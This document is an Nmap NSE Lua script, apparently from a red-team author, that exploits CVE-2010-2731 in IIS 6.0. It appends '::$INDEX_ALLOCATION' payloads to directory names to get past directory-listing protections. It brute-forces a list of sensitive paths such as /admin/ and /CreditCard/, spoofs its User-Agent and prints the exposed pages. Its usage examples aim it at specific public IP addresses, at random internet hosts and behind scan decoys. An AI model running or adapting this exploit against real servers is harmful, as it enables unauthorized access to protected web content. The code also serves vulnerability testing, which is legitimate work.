---
-- Nmap NSE IIS-CVE-2010-2731.nse - Version 1.3
-- Copy to: /usr/share/nmap/scripts/IIS-CVE-2010-2731.nse
-- Update NSE database: sudo nmap --script-updatedb
-- execute: nmap --script-help IIS-CVE-2010-2731.nse
-- Port(s) accepted: 80-86,8001,8080-8086
---

-- SCRIPT BANNER DESCRIPTION --
description = [[

Module Author: r00t-3xp10it
NSE script to detect if target [ip]:[port][/url] its affected by CVE-2010-2731 (Directory Listing Denied) 
This module bypasses Directory Listing protections for Internet Information Services (IIS/6.0). By appending a
payload to the end of the directory name in a request, it is possible to access webserver protected directorys.
Switchs: vuln=Server: Microsoft-ISS/6.0 (vulnerable version) | body=true (automatic display target body)
agent=User-Agent (User-Agent string to send in probes) | uri=directory to scan (If none uri its inputed then
this script tests a List of default [/url's] available in our database to brute force dictionary names).

Some Syntax examples:
nmap --script-help IIS-CVE-2010-2731.nse
nmap -sV -Pn -n -p 80-86,8001,8080-8086 --open --script IIS-CVE-2010-2731.nse 223.7.230.27
nmap -sV -Pn -n -p 80-86,8080-8086 --open --script IIS-CVE-2010-2731.nse --script-args "uri=/images/" 103.4.16.224
nmap -sS -Pn -n -p 80,8080-8086 --open --script IIS-CVE-2010-2731.nse --script-args "body=true,uri=/css" 89.30.142.85
nmap -sS -Pn -n -p 80,8080-8086 --open --script IIS-CVE-2010-2731.nse --script-args "vuln=Server: Microsoft-IIS/10.0" 115.187.32.38
nmap -sS -Pn -p 80,8080-8086 --open --script IIS-CVE-2010-2731.nse --script-args "agent=Mozilla/5.0 (compatible; EvilMonkey)" 89.30.142.85
nmap -sS -v -Pn -n -T5 -iR 700 -p 80-86,8001,8080-8086 --open --script=http-headers.nse,IIS-CVE-2010-2731.nse -D 65.49.82.3

]]

---
-- @usage
-- nmap --script-help IIS-CVE-2010-2731.nse
-- nmap -sV -Pn -p 80-86,8001,8080-8086 --open --script IIS-CVE-2010-2731.nse 223.7.230.27
-- nmap -sV -Pn -p 80-86,8080-8086 --open --script IIS-CVE-2010-2731.nse --script-args "uri=/images/" 223.7.230.27
-- nmap -sS -Pn -p 80,8080-8086 --open --script IIS-CVE-2010-2731.nse --script-args "agent=Mozilla/5.0 (compatible; EvilMonkey)" 223.7.230.27
-- nmap -sS -Pn -p 80,8080-8086 --open --script IIS-CVE-2010-2731.nse --script-args "agent=Mozilla/5.0 (compatible),uri=/fd/" 223.7.230.27
-- @output
-- PORT     STATE SERVICE VERSION
-- 80/tcp open  http
-- | IIS-CVE-2010-2731:
-- |   STATUS: FOUND - Directory Listing Denied
-- |       URL ACCESS: http://223.7.230.27:80/images/::$INDEX_ALLOCATION
-- |       Module Author: r00t-3xp10it (ssa redteam)
-- |_
-- @args payload.uri the path name to search. Default: /images/
-- @args payload.agent User-agent to send in request - Default: iPhone,safari
-- @args payload.vuln Microsoft-ISS vulnerable version - Default: Microsoft-ISS/6.0
-- @args payload.body Automatic display target webpage body - Default: false
---


author = "r00t-3xp10it (ssa redteam)"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"safe", "discovery"}


-- DEPENDENCIES (lua nse libraries) --
local stdnse = require ('stdnse') --> nse args usage
local shortport = require "shortport"
local string = require "string"
local table = require "table"
local http = require "http"
local nmap = require "nmap"
local os = require "os" --> required for (sleep)
-- define loop limmit(s)
limmit = 0


-- SET VALUES COLOR TERMINAL USE IN FUNCTION --
local colors = {
  -- attributes
  reset = 0,
  clear = 0,
  bright = 1,
  dim = 2,
  underscore = 4,
  blink = 5,
  reverse = 7,
  hidden = 8,

  -- foreground
  black = 30,
  red = 31,
  green = 32,
  yellow = 33,
  blue = 34,
  magenta = 35,
  cyan = 36,
  white = 37,

  -- background
  onblack = 40,
  onred = 41,
  ongreen = 42,
  onyellow = 43,
  onblue = 44,
  onmagenta = 45,
  oncyan = 46,
  onwhite = 47,
}

-- FUNCTION SET COLOR TERMINAL --
local function makecolor(value)
  value =  string.char(27) .. '[1;' .. tostring(value) .. 'm'
return value
end
-- SET VALUES COLOR TERMINAL --
local green_color = makecolor(colors.green)
local white_color = makecolor(colors.white)
local error_color = makecolor(colors.red)   
local reset_color = makecolor(colors.reset)
local yellow_color = makecolor(colors.yellow)
-- COLORING MADE BY MODULE --
local by_module = white_color.."r00t-3xp10it (ssa redteam)"..reset_color


-- THE RULE SECTION --
-- portrule = shortport.http --> Scan only the selected ports/proto/service_name in open state
portrule = shortport.port_or_service({80, 8001, 8080, 8081, 8082, 8083}, "http, http-proxy", "tcp", "open")


-- THE ACTION SECTION --
action = function(host, port)
print(yellow_color.."IIS-CVE-2010-2731:"..reset_color)
print("| "..yellow_color.."Checking exploit compatibility."..reset_color)



-- Make sure target its: Microsoft-IIS/6.0 (default)
local result
result = http.get(host, port, "/")
table.insert(result.rawheader, "mytable")
bias = stdnse.get_script_args(SCRIPT_NAME..".vuln") or "Server: Microsoft-IIS/6.0"


target = "false"
-- Loop truth table to grab server version
for _, value in pairs(result.rawheader) do
   if value == bias then
      target = value
   end
end

-- exit if none compatible server name its found
if (target == "false") then
   print("| ["..error_color.."404"..reset_color.."] NOT FOUND: "..bias)
   print("|\n|   STATUS: "..error_color..host.ip.." - Does not seems vuln to CVE-2010-2731"..reset_color.."\n|       Module Author: "..by_module.."\n|_")
   do return end
else
   print("| ["..green_color.."200"..reset_color.."] "..target)
end


   -- Sellect payload to use based on target uri
   disp = stdnse.get_script_args(SCRIPT_NAME..".body") or "false"
   uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/0/"
   local parse = string.sub(uri, -1) --> grab last char of uri
   if ( parse ~= "/" ) then
      payload = ":$i30:$INDEX_ALLOCATION"
   else
      payload = "::$INDEX_ALLOCATION"
   end

-- Manipulate TCP packet 'header' with false information about attacker :D
local options = {header={}}   --> manipulate 'header' request ..
options['header']['User-Agent'] = stdnse.get_script_args(SCRIPT_NAME..".agent") or "Mozilla/5.0 (iPhone; CPU iPhone OS 6_1_4 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B350 Safari/8536.25" --> use iPhone,safari User-agent OR your own...
options['header']['Accept-Language'] = "en-GB,en;q=0.8,sv" --> use en-GB as attacker default install language
options['header']['Cache-Control'] = "no-store" -->  Instruct webserver to not write it to disk (do not to cache it)


-- Scanning for directory names in target host
local check_uri = http.get(host, port, uri, options)
if (check_uri.status == 1003) then
   print("| ["..error_color..check_uri.status..reset_color.."] => http://"..host.ip..":"..port.number..error_color.." (Direct IP access not allowed)"..reset_color.."\n|_")
elseif ( check_uri.status == 404 ) then
   print("| "..yellow_color.."Scanning Directory Names."..reset_color)
   print("| ["..error_color..check_uri.status..reset_color.."] "..host.ip.." => "..uri)
   -- None User Input uri found => using table {uril} List
   uril = {"/img/", "/css/", "/ASP/", "/main/", "/home/", "/Data/", "/USER/", "/Mail/", "/News/", "/Site/", "/Page/", "/Excel/", "/login/", "/admin/", "/Views/", "/stats/", "/Pages/", "/admin1/", "/Survey/", "/Office/", "/PSUser/", "/Citrix/", "/Common/", "/images/", "/account/", "/Sources/", "/Example/", "/History/", "/Plug-Ins/", "/UserFiles/", "/adminRoot/", "/ISSamples/", "/FCKeditor/", "/Templates/", "/adminuser/", "/adsamples/", "/Web_Store/", "/admin-serv/", "/CreditCard/", "/adminmysql/", "/Statistics/", "/ProductCart/", "/addressBook/", "/AdvWebAdmin/", "/DomainFiles/", "/HBTemplates/", "/administator/", "/Administration/", "/CustomerService/", "/adminphpmyadmin/"}
   -- loop Through {table} of uri url's
   for i, intable in pairs(uril) do
      local res = http.get(host, port, intable)
      if (res.status == 403) then
         print("| ["..green_color..res.status..reset_color.."] "..host.ip.." => "..intable..green_color.." (found)"..reset_color)
         limmit = limmit+1 --> count how many interactions (loops done)
         os.execute("sleep 0.3")
         uri = intable..payload --> define uri variable with payload now
         if ( limmit == 51 ) then
            print("|_")
            os.execute("sleep 1")
            return --> exit() on the end of uri list tests
         end
      else
        limmit = limmit+1 --> count how many interactions (loops done)
        print("| ["..error_color.."404"..reset_color.."] "..host.ip.." => "..intable)
        os.execute("sleep 0.3")
        if ( limmit == 51 ) then --> why 51? Because its the number of URI links present in the {table} list.
           print("|_")
           os.execute("sleep 1")
           return --> exit() on the end of uri list tests
        end
      end
   end
-- More error codes
elseif ( check_uri.status == 400 or check_uri.status == 405 or check_uri.status == 500 or check_uri.status == 502 or check_uri.status == 503 or check_uri.status == 307 or check_uri.status == 302 or check_uri.status == 301 or check_uri.status == nil ) then
   print("| ["..error_color..check_uri.status..reset_color.."] "..host.ip.." => "..uri)
   do return end --> exit if any of this error codes returns
elseif ( check_uri.status == 403 ) then
   print("| ["..green_color..check_uri.status..reset_color.."] "..host.ip.." => "..uri)
   uri = uri..payload
end


-- Sending payload to sellected uri (last uri found)
print("|\n| ["..green_color.."200"..reset_color.."] "..yellow_color.."Sending tcp packet with payload attached."..reset_color)
os.execute("sleep 1")
if ( uri == "/0/" ) then
   print("| STATUS: "..error_color.."None Match has been found in IIS-CVE-2010-2731 database."..reset_color.."\n|       URL ACCESS:"..error_color.." http://"..host.ip..":"..port.number..reset_color.."\n|       Module Author: "..by_module.."\n|_")
else
-- Trying to bypass directory protections
local bypass = http.get(host, port, uri, options)
   if (bypass.status == 1003 or bypass.body:match("Direct IP access not allowed")) then 
      print("|   STATUS: "..error_color.."ERROR - Direct IP access not allowed"..reset_color.."\n|       URL ACCESS:"..error_color.." http://"..host.ip..":"..port.number..uri..reset_color.."\n|       Module Author: "..by_module.."\n|_")
      os.execute("sleep 2")
      if ( disp == "true" ) then
         print("\n"..bypass.body.."\n")
      end
   elseif (bypass.status == 501 or bypass.body:match("Not Implemented")) then
      print("|   STATUS: "..error_color.."ERROR - Not Implemented"..reset_color.."\n|       URL ACCESS:"..error_color.." http://"..host.ip..":"..port.number..uri..reset_color.."\n|       Module Author: "..by_module.."\n|_")
      os.execute("sleep 2")
      if ( disp == "true" ) then
         print("\n"..bypass.body.."\n")
      end
   elseif (bypass.body and bypass.status == 404) then
      print("|   STATUS: "..green_color.."BYPASSED - Directory Listing Denied"..reset_color.."\n|       URL ACCESS:"..green_color.." http://"..host.ip..":"..port.number..uri..reset_color.."\n|       Module Author: "..by_module.."\n|_")
      os.execute("sleep 2")
      if ( disp == "true" ) then
         print("\n"..bypass.body.."\n")
      end
   else
      print("|   STATUS: "..error_color..host.ip.." - Does not seem to by vuln to CVE-2010-2731"..reset_color.."\n|       URL ACCESS:"..error_color.." http://"..host.ip..":"..port.number..uri..reset_color.."\n|       Module Author: "..by_module.."\n|_")
      os.execute("sleep 2")
      if ( disp == "true" ) then
         print("\n"..bypass.body.."\n")
      end
   end
 end
end
